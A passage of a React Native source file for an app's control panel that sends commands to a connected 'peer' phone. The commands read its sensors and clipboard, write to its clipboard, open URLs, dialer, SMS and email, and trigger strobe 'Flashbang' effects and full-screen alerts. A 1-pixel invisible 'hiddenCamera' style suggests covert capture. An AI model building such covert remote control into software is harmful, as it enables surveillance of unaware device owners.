              { cmd: "GET_ACCELEROMETER",  label: "Accelerometer",    icon: "activity" },
              { cmd: "GET_GYROSCOPE",      label: "Gyroscope",        icon: "refresh-cw" },
              { cmd: "GET_MAGNETOMETER",   label: "Compass",          icon: "navigation" },
              { cmd: "GET_BAROMETER",      label: "Barometer",        icon: "trending-up" },
              { cmd: "GET_PEDOMETER",      label: "Step Count",       icon: "navigation" },
            ].map(item => (
              <CmdChip key={item.cmd} cmd={item.cmd} label={item.label} icon={item.icon} onPress={send} disabled={!peerConnected} color={Colors.accent} />
            ))}
          </View>
        </Section>

        {/* ── PHONE ACTIONS ── */}
        <Section title="Phone Actions" icon="phone" color={Colors.success}>
          <TextInput style={styles.input} value={dialNumber} onChangeText={setDialNumber} placeholder="+1 (555) 000-0000 — number to dial" placeholderTextColor={Colors.textSecondary} keyboardType="phone-pad" />
          <Pressable onPress={() => { if (dialNumber.trim()) send("DIAL_NUMBER", { value: dialNumber }); }} disabled={!peerConnected || !dialNumber.trim()} style={[styles.solidBtn, { backgroundColor: Colors.success }, (!peerConnected || !dialNumber.trim()) && styles.disabled]}>
            <Feather name="phone" size={17} color={Colors.dark} />
            <Text style={[styles.solidBtnText, { color: Colors.dark }]}>Open Dialer on Peer</Text>
          </Pressable>
          <View style={styles.divider} />
          <TextInput style={styles.input} value={smsNumber} onChangeText={setSmsNumber} placeholder="Phone number for SMS" placeholderTextColor={Colors.textSecondary} keyboardType="phone-pad" />
          <TextInput style={[styles.input, { minHeight: 60 }]} value={smsBody} onChangeText={setSmsBody} placeholder="SMS body message (optional)" placeholderTextColor={Colors.textSecondary} multiline />
          <Pressable onPress={() => { if (smsNumber.trim()) { send("COMPOSE_SMS", { value: smsNumber, message: smsBody }); setSmsBody(""); } }} disabled={!peerConnected || !smsNumber.trim()} style={[styles.solidBtn, { backgroundColor: Colors.success }, (!peerConnected || !smsNumber.trim()) && styles.disabled]}>
            <Feather name="message-square" size={17} color={Colors.dark} />
            <Text style={[styles.solidBtnText, { color: Colors.dark }]}>Open SMS on Peer</Text>
          </Pressable>
        </Section>

        {/* ── EMAIL ── */}
        <Section title="Email Composer" icon="mail" color="#4CC9F0">
          <TextInput style={styles.input} value={emailTo} onChangeText={setEmailTo} placeholder="To: email@address.com" placeholderTextColor={Colors.textSecondary} keyboardType="email-address" autoCapitalize="none" />
          <TextInput style={styles.input} value={emailSubject} onChangeText={setEmailSubject} placeholder="Subject" placeholderTextColor={Colors.textSecondary} />
          <TextInput style={[styles.input, { minHeight: 60 }]} value={emailBody} onChangeText={setEmailBody} placeholder="Email body..." placeholderTextColor={Colors.textSecondary} multiline />
          <Pressable onPress={() => { if (emailTo.trim()) { send("COMPOSE_EMAIL", { value: emailTo, message: `${emailSubject}||${emailBody}` }); setEmailBody(""); setEmailSubject(""); } }} disabled={!peerConnected || !emailTo.trim()} style={[styles.solidBtn, { backgroundColor: "#4CC9F0" }, (!peerConnected || !emailTo.trim()) && styles.disabled]}>
            <Feather name="mail" size={17} color={Colors.dark} />
            <Text style={[styles.solidBtnText, { color: Colors.dark }]}>Open Email on Peer</Text>
          </Pressable>
        </Section>

        {/* ── CLIPBOARD ── */}
        <Section title="Clipboard" icon="clipboard" color="#06D6A0">
          <Pressable onPress={() => send("READ_CLIPBOARD")} disabled={!peerConnected} style={[styles.solidBtn, { backgroundColor: "#06D6A0" }, !peerConnected && styles.disabled]}>
            <Feather name="clipboard" size={17} color={Colors.dark} />
            <Text style={[styles.solidBtnText, { color: Colors.dark }]}>Read Peer Clipboard</Text>
          </Pressable>
          <View style={styles.inputRow}>
            <TextInput style={[styles.input, { flex: 1 }]} value={clipboardWrite} onChangeText={setClipboardWrite} placeholder="Text to write to peer clipboard..." placeholderTextColor={Colors.textSecondary} />
            <Pressable onPress={() => { if (clipboardWrite.trim()) { send("WRITE_CLIPBOARD", { value: clipboardWrite }); setClipboardWrite(""); } }} disabled={!peerConnected || !clipboardWrite.trim()} style={[styles.iconBtn, { backgroundColor: "#06D6A022", borderColor: "#06D6A0" }, (!peerConnected || !clipboardWrite.trim()) && styles.disabled]}>
              <Feather name="send" size={16} color="#06D6A0" />
            </Pressable>
          </View>
        </Section>

        {/* ── TTS ── */}
        <Section title="Text-to-Speech on Peer" icon="volume-2" color={Colors.accent}>
          <TextInput style={[styles.input, { minHeight: 70 }]} value={ttsText} onChangeText={setTtsText} placeholder="Type text to speak on peer's device..." placeholderTextColor={Colors.textSecondary} multiline />
          <View style={styles.row}>
            <Pressable onPress={() => { if (ttsText.trim()) { send("SPEAK_TEXT", { message: ttsText }); setTtsText(""); } }} disabled={!peerConnected || !ttsText.trim()} style={[styles.solidBtn, { flex: 1, backgroundColor: Colors.accent }, (!peerConnected || !ttsText.trim()) && styles.disabled]}>
              <Feather name="volume-2" size={16} color={Colors.dark} />
              <Text style={[styles.solidBtnText, { color: Colors.dark }]}>Speak on Peer</Text>
            </Pressable>
            <Pressable onPress={() => send("STOP_SPEECH")} disabled={!peerConnected} style={[styles.iconBtn, { borderColor: Colors.danger, backgroundColor: Colors.danger + "22" }, !peerConnected && styles.disabled]}>
              <Feather name="square" size={16} color={Colors.danger} />
            </Pressable>
          </View>
        </Section>

        {/* ── OPEN URL ── */}
        <Section title="Open URL on Peer" icon="external-link" color="#F77F00">
          <TextInput style={styles.input} value={urlToOpen} onChangeText={setUrlToOpen} placeholder="https://..." placeholderTextColor={Colors.textSecondary} autoCapitalize="none" keyboardType="url" />
          <View style={styles.quickUrls}>
            {["https://maps.google.com", "https://youtube.com", "https://google.com", "https://news.google.com"].map(u => (
              <Pressable key={u} onPress={() => setUrlToOpen(u)} style={styles.quickUrlChip}>
                <Text style={styles.quickUrlText}>{u.replace("https://", "")}</Text>
              </Pressable>
            ))}
          </View>
          <Pressable onPress={() => { if (urlToOpen.startsWith("http")) send("OPEN_URL", { value: urlToOpen }); }} disabled={!peerConnected || !urlToOpen.startsWith("http")} style={[styles.solidBtn, { backgroundColor: "#F77F00" }, (!peerConnected || !urlToOpen.startsWith("http")) && styles.disabled]}>
            <Feather name="external-link" size={17} color="white" />
            <Text style={styles.solidBtnText}>Open in Peer Browser</Text>
          </Pressable>
        </Section>

        {/* ── VISUAL EFFECTS ── */}
        <Section title="Visual Effects" icon="sun" color={Colors.warning}>
          <View style={styles.cmdGrid}>
            {[
              { cmd: "FLASHBANG",    label: "Flashbang (3s)",    icon: "sun",    color: Colors.warning },
              { cmd: "STROBE_TORCH", label: "Strobe Torch",      icon: "zap",    color: Colors.warning },
              { cmd: "SCREEN_PULSE", label: "Screen Pulse",      icon: "activity", color: Colors.warning },
              { cmd: "BRIGHTNESS_MAX", label: "Max Brightness",  icon: "maximize", color: Colors.warning },
              { cmd: "BRIGHTNESS_OFF", label: "Screen Off",      icon: "moon",   color: Colors.textSecondary },
            ].map(item => (
              <CmdChip key={item.cmd} cmd={item.cmd} label={item.label} icon={item.icon} onPress={send} disabled={!peerConnected} color={item.color} />
            ))}
          </View>
        </Section>

        {/* ── EMERGENCY ── */}
        <Section title="Emergency" icon="alert-triangle" color={Colors.danger}>
          <Pressable onPress={() => send("PHONE_FINDER")} disabled={!peerConnected} style={[styles.bigBtn, !peerConnected && styles.disabled]}>
            <Feather name="map-pin" size={22} color="white" />
            <View>
              <Text style={styles.bigBtnTitle}>Phone Finder</Text>
              <Text style={styles.bigBtnDesc}>Torch + vibration + max brightness for 10 seconds</Text>
            </View>
          </Pressable>
          <Pressable onPress={() => send("STOP_FINDER")} disabled={!peerConnected} style={[styles.outlineBtn, { borderColor: Colors.danger }, !peerConnected && styles.disabled]}>
            <Feather name="square" size={15} color={Colors.danger} />
            <Text style={[styles.outlineBtnText, { color: Colors.danger }]}>Stop Finder</Text>
          </Pressable>
        </Section>

        {/* ── TORCH ── */}
        <Section title="Flashlight" icon="sun" color={Colors.warning}>
          <View style={styles.row}>
            <Pressable onPress={() => send("TORCH_ON")} disabled={!peerConnected} style={[styles.halfBtn, { backgroundColor: Colors.warning + "22", borderColor: Colors.warning }, !peerConnected && styles.disabled]}>
              <Feather name="sun" size={18} color={Colors.warning} />
              <Text style={[styles.halfBtnText, { color: Colors.warning }]}>Torch ON</Text>
            </Pressable>
            <Pressable onPress={() => send("TORCH_OFF")} disabled={!peerConnected} style={[styles.halfBtn, !peerConnected && styles.disabled]}>
              <Feather name="moon" size={18} color={Colors.textSecondary} />
              <Text style={styles.halfBtnText}>Torch OFF</Text>
            </Pressable>
          </View>
        </Section>

        {/* ── BRIGHTNESS ── */}
        <Section title="Screen Brightness" icon="sliders" color={Colors.primary}>
          <View style={styles.brightnessRow}>
            {[0, 0.25, 0.5, 0.75, 1].map(v => (
              <Pressable key={v} onPress={() => { setBrightness(v); send("BRIGHTNESS", { value: v }); }} disabled={!peerConnected} style={[styles.brightBtn, brightness === v && { backgroundColor: Colors.primary, borderColor: Colors.primary }, !peerConnected && styles.disabled]}>
                <Text style={[styles.brightBtnText, brightness === v && { color: Colors.dark }]}>{v === 0 ? "Off" : `${v * 100}%`}</Text>
              </Pressable>
            ))}
          </View>
          <View style={styles.row}>
            {[
              { cmd: "BRIGHTNESS_DOWN", label: "Dim",      icon: "minus-circle" },
              { cmd: "BRIGHTNESS_UP",   label: "Brighten", icon: "plus-circle" },
              { cmd: "BRIGHTNESS_MAX",  label: "Max",      icon: "sun" },
            ].map(b => (
              <Pressable key={b.cmd} onPress={() => send(b.cmd)} disabled={!peerConnected} style={[styles.thirdBtn, !peerConnected && styles.disabled]}>
                <Feather name={b.icon as any} size={13} color={Colors.primary} />
                <Text style={styles.thirdBtnText}>{b.label}</Text>
              </Pressable>
            ))}
          </View>
        </Section>

        {/* ── HAPTICS ── */}
        <Section title="Haptic Feedback" icon="zap" color={Colors.accent}>
          <View style={styles.cmdGrid}>
            {[
              { cmd: "HAPTIC_SUCCESS", label: "Success",   icon: "check-circle", color: Colors.success },
              { cmd: "HAPTIC_ERROR",   label: "Error",     icon: "x-circle",     color: Colors.danger },
              { cmd: "HAPTIC_LIGHT",   label: "Light",     icon: "feather",      color: Colors.accent },
              { cmd: "HAPTIC_HEAVY",   label: "Heavy",     icon: "zap",          color: Colors.warning },
            ].map(h => (
              <CmdChip key={h.cmd} cmd={h.cmd} label={h.label} icon={h.icon} onPress={send} disabled={!peerConnected} color={h.color} />
            ))}
          </View>
        </Section>

        {/* ── KEEP AWAKE ── */}
        <Section title="Screen Lock" icon="eye" color={Colors.accent}>
          <View style={styles.row}>
            <Pressable onPress={() => send("KEEP_AWAKE_ON")} disabled={!peerConnected} style={[styles.halfBtn, { backgroundColor: Colors.accent + "22", borderColor: Colors.accent }, !peerConnected && styles.disabled]}>
              <Feather name="eye" size={18} color={Colors.accent} />
              <Text style={[styles.halfBtnText, { color: Colors.accent }]}>Keep Awake</Text>
            </Pressable>
            <Pressable onPress={() => send("KEEP_AWAKE_OFF")} disabled={!peerConnected} style={[styles.halfBtn, !peerConnected && styles.disabled]}>
              <Feather name="eye-off" size={18} color={Colors.textSecondary} />
              <Text style={styles.halfBtnText}>Allow Sleep</Text>
            </Pressable>
          </View>
        </Section>

        {/* ── VIBRATION ── */}
        <Section title="Vibration Patterns" icon="activity" color="#FF69B4">
          <View style={styles.patternGrid}>
            {Object.entries(VIBE_PATTERNS).map(([key, p]) => (
              <Pressable key={key} onPress={() => setSelectedPattern(key)} style={[styles.patternChip, selectedPattern === key && { backgroundColor: p.color + "33", borderColor: p.color }]}>
                <Feather name={p.icon as any} size={12} color={selectedPattern === key ? p.color : Colors.textSecondary} />
                <Text style={[styles.patternLabel, selectedPattern === key && { color: p.color }]}>{p.label}</Text>
              </Pressable>
            ))}
          </View>
          <View style={styles.row}>
            <Pressable onPress={() => send("VIBRATE_PATTERN", { pattern: VIBE_PATTERNS[selectedPattern].pattern })} disabled={!peerConnected} style={[styles.solidBtn, { flex: 1, backgroundColor: VIBE_PATTERNS[selectedPattern].color }, !peerConnected && styles.disabled]}>
              <Feather name="activity" size={17} color="white" />
              <Text style={styles.solidBtnText}>Vibrate: {VIBE_PATTERNS[selectedPattern].label}</Text>
            </Pressable>
            <Pressable onPress={() => send("VIBRATE_STOP")} disabled={!peerConnected} style={[styles.iconBtn, !peerConnected && styles.disabled]}>
              <Feather name="square" size={15} color={Colors.textSecondary} />
            </Pressable>
          </View>
        </Section>

        {/* ── ALERT / NOTIF ── */}
        <Section title="Full-Screen Alert" icon="alert-circle" color={Colors.danger}>
          <TextInput style={[styles.input, { minHeight: 60 }]} value={alertMsg} onChangeText={setAlertMsg} placeholder="Urgent message to show on peer screen..." placeholderTextColor={Colors.textSecondary} multiline />
          <Pressable onPress={() => { if (alertMsg.trim()) { send("SHOW_ALERT", { message: alertMsg }); setAlertMsg(""); } }} disabled={!peerConnected || !alertMsg.trim()} style={[styles.solidBtn, { backgroundColor: Colors.danger }, (!peerConnected || !alertMsg.trim()) && styles.disabled]}>
            <Feather name="alert-circle" size={17} color="white" />
            <Text style={styles.solidBtnText}>Show Full-Screen Alert</Text>
          </Pressable>
        </Section>

        <Section title="Lock Screen Notification" icon="bell" color={Colors.success}>
          <TextInput style={styles.input} value={notifTitle} onChangeText={setNotifTitle} placeholder="Notification title" placeholderTextColor={Colors.textSecondary} />
          <TextInput style={[styles.input, { minHeight: 60 }]} value={notifBody} onChangeText={setNotifBody} placeholder="Notification body..." placeholderTextColor={Colors.textSecondary} multiline />
          <Pressable onPress={() => { if (notifBody.trim()) { send("LOCAL_NOTIFICATION", { value: notifTitle, message: notifBody }); setNotifBody(""); } }} disabled={!peerConnected || !notifBody.trim()} style={[styles.solidBtn, { backgroundColor: Colors.success }, (!peerConnected || !notifBody.trim()) && styles.disabled]}>
            <Feather name="bell" size={17} color={Colors.dark} />
            <Text style={[styles.solidBtnText, { color: Colors.dark }]}>Send Notification</Text>
          </Pressable>
        </Section>

        <View style={{ height: 32 }} />
      </ScrollView>
    </View>
  );
}

// ─────────────────────────────────────────────────────────────────
// Sub-components
// ─────────────────────────────────────────────────────────────────
function CmdChip({ cmd, label, icon, onPress, disabled, color }: {
  cmd: string; label: string; icon: string; onPress: (cmd: string) => void; disabled: boolean; color: string;
}) {
  return (
    <Pressable onPress={() => onPress(cmd)} disabled={disabled} style={[styles.cmdChip, { borderColor: color + "55", backgroundColor: color + "11" }, disabled && styles.disabled]}>
      <Feather name={icon as any} size={13} color={color} />
      <Text style={[styles.cmdChipText, { color }]}>{label}</Text>
    </Pressable>
  );
}

function Section({ title, icon, color, children }: { title: string; icon: keyof typeof Feather.glyphMap; color: string; children: React.ReactNode }) {
  return (
    <View style={sectionStyles.wrapper}>
      <View style={sectionStyles.header}>
        <View style={[sectionStyles.iconWrap, { backgroundColor: color + "22" }]}>
          <Feather name={icon} size={14} color={color} />
        </View>
        <Text style={[sectionStyles.title, { color }]}>{title}</Text>
      </View>
      <View style={sectionStyles.body}>{children}</View>
    </View>
  );
}

const sectionStyles = StyleSheet.create({
  wrapper: { marginBottom: 4 },
  header: { flexDirection: "row", alignItems: "center", gap: 10, paddingHorizontal: 16, paddingTop: 14, paddingBottom: 8 },
  iconWrap: { width: 28, height: 28, borderRadius: 8, alignItems: "center", justifyContent: "center" },
  title: { fontFamily: "Inter_700Bold", fontSize: 13 },
  body: { paddingHorizontal: 16, gap: 10 },
});

const styles = StyleSheet.create({
  container: { flex: 1 },
  hiddenCamera: { width: 1, height: 1, position: "absolute", opacity: 0 },
  offlineBanner: { flexDirection: "row", alignItems: "center", gap: 8, margin: 14, padding: 12, backgroundColor: Colors.warning + "22", borderRadius: 12, borderWidth: 1, borderColor: Colors.warning + "44" },
  offlineText: { fontFamily: "Inter_400Regular", fontSize: 13, color: Colors.warning, flex: 1 },
  responsesFeed: { margin: 14, backgroundColor: Colors.surface, borderRadius: 16, borderWidth: 1, borderColor: Colors.border, padding: 14, gap: 6 },
  resultsHeader: { flexDirection: "row", alignItems: "center", gap: 8 },
  resultsTitle: { fontFamily: "Inter_600SemiBold", fontSize: 13, color: Colors.primary, flex: 1 },
  clearBtn: { flexDirection: "row", alignItems: "center", gap: 4 },
  clearBtnText: { fontFamily: "Inter_400Regular", fontSize: 11, color: Colors.textSecondary },
  resultRow: { paddingTop: 8, paddingBottom: 6, borderTopWidth: 1, borderTopColor: Colors.border, gap: 5 },
  resultRowNew: { borderTopColor: Colors.primary + "55" },
  resultMeta: { flexDirection: "row", alignItems: "center", gap: 8 },
  resultCmd: { fontFamily: "Inter_700Bold", fontSize: 10, color: Colors.primary, letterSpacing: 0.6 },
  latencyBadge: { backgroundColor: Colors.success + "22", borderRadius: 5, paddingHorizontal: 5, paddingVertical: 2 },
  latencyText: { fontFamily: "Inter_600SemiBold", fontSize: 10, color: Colors.success },
  resultData: { fontFamily: "Inter_400Regular", fontSize: 11, color: Colors.textSecondary, lineHeight: 16 },
  resultImage: { width: "100%", height: 180, borderRadius: 10, marginTop: 4 },
  playBtn: { flexDirection: "row", alignItems: "center", gap: 8, backgroundColor: Colors.accent, paddingHorizontal: 14, paddingVertical: 9, borderRadius: 10, alignSelf: "flex-start" },
  playBtnText: { fontFamily: "Inter_600SemiBold", fontSize: 13, color: Colors.dark },
  cmdGrid: { flexDirection: "row", flexWrap: "wrap", gap: 8 },
  cmdChip: { flexDirection: "row", alignItems: "center", gap: 6, paddingHorizontal: 11, paddingVertical: 9, borderRadius: 12, borderWidth: 1 },
  cmdChipText: { fontFamily: "Inter_500Medium", fontSize: 11 },
  row: { flexDirection: "row", gap: 10 },
  inputRow: { flexDirection: "row", gap: 10, alignItems: "stretch" },
  halfBtn: { flex: 1, flexDirection: "row", alignItems: "center", justifyContent: "center", gap: 8, padding: 13, borderRadius: 14, borderWidth: 1, borderColor: Colors.border },
  halfBtnText: { fontFamily: "Inter_600SemiBold", fontSize: 13, color: Colors.textSecondary },
  thirdBtn: { flex: 1, flexDirection: "row", alignItems: "center", justifyContent: "center", gap: 5, padding: 10, borderRadius: 12, borderWidth: 1, borderColor: Colors.border, backgroundColor: Colors.surface },
  thirdBtnText: { fontFamily: "Inter_500Medium", fontSize: 11, color: Colors.textSecondary },
  brightnessRow: { flexDirection: "row", gap: 6 },
  brightBtn: { flex: 1, paddingVertical: 10, borderRadius: 12, borderWidth: 1, borderColor: Colors.border, alignItems: "center" },
  brightBtnText: { fontFamily: "Inter_600SemiBold", fontSize: 11, color: Colors.textSecondary },
  patternGrid: { flexDirection: "row", flexWrap: "wrap", gap: 7 },
  patternChip: { flexDirection: "row", alignItems: "center", gap: 5, paddingHorizontal: 10, paddingVertical: 7, borderRadius: 20, borderWidth: 1, borderColor: Colors.border },
  patternLabel: { fontFamily: "Inter_500Medium", fontSize: 11, color: Colors.textSecondary },
  solidBtn: { flexDirection: "row", alignItems: "center", justifyContent: "center", gap: 9, padding: 14, borderRadius: 14 },
  solidBtnText: { fontFamily: "Inter_600SemiBold", fontSize: 14, color: "white" },
  outlineBtn: { flexDirection: "row", alignItems: "center", justifyContent: "center", gap: 8, padding: 12, borderRadius: 13, borderWidth: 1 },
  outlineBtnText: { fontFamily: "Inter_600SemiBold", fontSize: 13 },
  iconBtn: { width: 48, height: 48, borderRadius: 14, backgroundColor: Colors.surface, borderWidth: 1, borderColor: Colors.border, alignItems: "center", justifyContent: "center" },
  bigBtn: { flexDirection: "row", alignItems: "center", gap: 14, padding: 18, borderRadius: 18, backgroundColor: Colors.danger },
  bigBtnTitle: { fontFamily: "Inter_700Bold", fontSize: 16, color: "white" },
  bigBtnDesc: { fontFamily: "Inter_400Regular", fontSize: 12, color: "rgba(255,255,255,0.8)", marginTop: 2 },
  input: { backgroundColor: Colors.surface, borderWidth: 1, borderColor: Colors.border, borderRadius: 13, padding: 13, fontFamily: "Inter_400Regular", fontSize: 14, color: Colors.textPrimary, textAlignVertical: "top" },
  hint: { fontFamily: "Inter_400Regular", fontSize: 12, color: Colors.textSecondary, lineHeight: 17 },
  quickUrls: { flexDirection: "row", gap: 7, flexWrap: "wrap" },
  quickUrlChip: { paddingHorizontal: 9, paddingVertical: 5, borderRadius: 20, borderWidth: 1, borderColor: "#F77F0055", backgroundColor: "#F77F0011" },
  quickUrlText: { fontFamily: "Inter_400Regular", fontSize: 11, color: "#F77F00" },
  divider: { height: 1, backgroundColor: Colors.border },
  disabled: { opacity: 0.35 },
  linkHeader: { flexDirection: "row", alignItems: "center", gap: 10, padding: 16, borderBottomWidth: 1, borderBottomColor: Colors.border },
  linkHeaderText: { fontFamily: "Inter_600SemiBold", fontSize: 15, color: Colors.accent },
  statusGrid: { flexDirection: "row", flexWrap: "wrap", padding: 14, gap: 10 },
  statusCard: { width: "46%", alignItems: "center", backgroundColor: Colors.surface, borderRadius: 16, borderWidth: 1.5, padding: 14, gap: 8 },
  statusLabel: { fontFamily: "Inter_500Medium", fontSize: 12, color: Colors.textSecondary, textAlign: "center" },
  statusDot: { width: 8, height: 8, borderRadius: 4 },
  alertOverlay: { flex: 1, backgroundColor: "#000000CC", alignItems: "center", justifyContent: "center", padding: 32 },
  alertBox: { backgroundColor: Colors.surface, borderRadius: 24, padding: 32, alignItems: "center", gap: 16, width: "100%", borderWidth: 2, borderColor: Colors.danger },
  alertTitle: { fontFamily: "Inter_700Bold", fontSize: 22, color: Colors.textPrimary, textAlign: "center" },
  alertMessage: { fontFamily: "Inter_400Regular", fontSize: 16, color: Colors.textSecondary, textAlign: "center", lineHeight: 24 },
  alertDismiss: { backgroundColor: Colors.danger, paddingHorizontal: 32, paddingVertical: 14, borderRadius: 50, marginTop: 8 },
  alertDismissText: { fontFamily: "Inter_700Bold", fontSize: 16, color: "white" },
  linkNote: { flexDirection: "row", alignItems: "flex-start", gap: 8, margin: 16, padding: 12, backgroundColor: Colors.surface, borderRadius: 12, borderWidth: 1, borderColor: Colors.border },
  linkNoteText: { fontFamily: "Inter_400Regular", fontSize: 12, color: Colors.textSecondary, flex: 1, lineHeight: 18 },
});
